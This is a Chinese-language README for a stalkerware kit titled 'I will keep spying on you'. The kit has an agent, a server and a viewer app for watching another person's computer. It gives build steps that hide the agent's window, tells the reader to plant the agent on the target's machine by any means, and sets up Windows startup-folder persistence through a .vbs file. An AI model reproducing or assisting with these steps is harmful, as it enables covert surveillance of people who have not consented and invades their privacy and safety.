# 我会一直视奸你
> 一直、一直、一直

## 一款三端的视奸工具

### 被视奸方-agent

- 适用于`macOS`，`Windows`
- 记得修改源码中服务器地址
- 编译: `go mod tidy`
  - `go build -ldflags="-H=windowsgui" -o monitor-agent.exe main.go`
  - 命令行参数-H=windowsgui可以隐藏终端       
- 用你的办法埋好雷把软件放到ta电脑上并试运行一次
- 保存`.bat`和`.vbs`文件，修改其中对应路径
- 按 `Win + R`，输入 `shell:startup` 并回车。把`.vbs`文件放进去就行了。

### 服务器-server

- 需要CGO_ENABLED，所以不建议交叉编译。
- 在你服务器上：`go mod tidy`
    - `go build -o monitor-server main.go`
- 记得配好端口，然后`nohup ./monitor-server &`就完事了

### 阴暗的保安-SyncViewer

- 需要`wails`环境。
- 适用于`macOS`，`Windows`
- 在`app.go`中修改服务器地址
- `wails build`后再`build/bin`文件夹下就能找到软件了，打开就能美美视奸对面了。